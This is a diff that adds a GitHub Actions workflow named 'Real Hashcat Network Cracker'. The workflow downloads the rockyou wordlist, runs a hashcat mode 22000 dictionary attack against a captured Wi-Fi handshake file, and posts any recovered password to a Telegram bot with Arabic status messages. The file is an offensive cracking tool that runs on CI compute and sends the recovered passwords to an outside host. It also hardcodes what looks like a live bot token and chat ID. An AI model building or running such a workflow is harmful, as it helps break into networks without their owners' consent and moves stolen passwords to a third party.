@@ -1,0 +1,42 @@
+name: Real Hashcat Network Cracker
+
+on:
+  workflow_dispatch:
+
+jobs:
+  crack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Install Tools
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y hashcat curl
+
+      - name: Download Big Network Wordlist
+        run: |
+          curl -L -o rockyou.txt.gz https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+          gunzip -f rockyou.txt.gz || true
+
+      - name: Run Hashcat Cracking
+        run: |
+          hashcat -m 22000 target_hash.hc22000 rockyou.txt --potfile-path=result.txt || true
+
+      - name: Send Telegram Notification
+        run: |
+          BOT_TOKEN="8855829659:AAEscvl3G-abK4ks_HYbKY0pTpMRjoO2YwY"
+          CHAT_ID="6044239374"
+
+          if [ -s result.txt ]; then
+            PASSWORD=$(cat result.txt | awk -F':' '{print $NF}')
+            MSG="✅ *تم كسر الهاش بنجاح!*%0A%0A🔑 *كلمة السر هي:* \`$PASSWORD\`"
+          else
+            MSG="❌ *انتهى الفحص ولم يتم العثور على كلمة السر داخل القاموس.*"
+          fi
+
+          curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+            -d "chat_id=${CHAT_ID}" \
+            -d "text=${MSG}" \
+            -d "parse_mode=Markdown"
